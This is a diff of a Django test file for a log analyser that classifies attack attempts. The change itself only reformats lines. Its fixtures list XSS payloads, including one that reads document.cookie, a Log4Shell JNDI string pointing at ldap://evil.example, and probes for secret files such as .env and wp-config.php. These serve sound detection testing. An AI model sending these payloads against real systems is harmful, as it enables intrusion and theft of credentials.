@@ -27,7 +27,7 @@ class DeteccionTests(SimpleTestCase):
         "Posible ataque XSS detectado": [
             "/?q=<script>alert(1)</script>",
             "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
-            "/?q=%253Csvg%2520onload%253Dalert(1)%253E",   # doble codificación
+            "/?q=%253Csvg%2520onload%253Dalert(1)%253E",  # doble codificación
             "/?next=javascript:alert(document.cookie)",
         ],
         "Intento de Path Traversal": [
@@ -45,7 +45,11 @@ class DeteccionTests(SimpleTestCase):
             "/?x=${${lower:j}ndi:ldap://evil.example/a}",
         ],
         "Búsqueda de archivos sensibles": [
-            "/.env", "/.git/config", "/wp-config.php", "/phpmyadmin/", "/backup.sql",
+            "/.env",
+            "/.git/config",
+            "/wp-config.php",
+            "/phpmyadmin/",
+            "/backup.sql",
         ],
     }
 
@@ -104,9 +108,9 @@ class FuerzaBrutaYUmbralesTests(SimpleTestCase):
 
     def test_formatos_de_fecha(self):
         lineas = [
-            _acceso("/"),                                     # Apache: 10h
-            "2026-05-07T15:00:00Z level=info msg=ok",          # ISO: 15h
-            "May  7 22:01:02 srv cron[1]: job ok",             # syslog: 22h
+            _acceso("/"),  # Apache: 10h
+            "2026-05-07T15:00:00Z level=info msg=ok",  # ISO: 15h
+            "May  7 22:01:02 srv cron[1]: job ok",  # syslog: 22h
         ]
         self.assertEqual(analizar_logs(lineas)["actividad_por_hora"], {"10": 1, "15": 1, "22": 1})
 
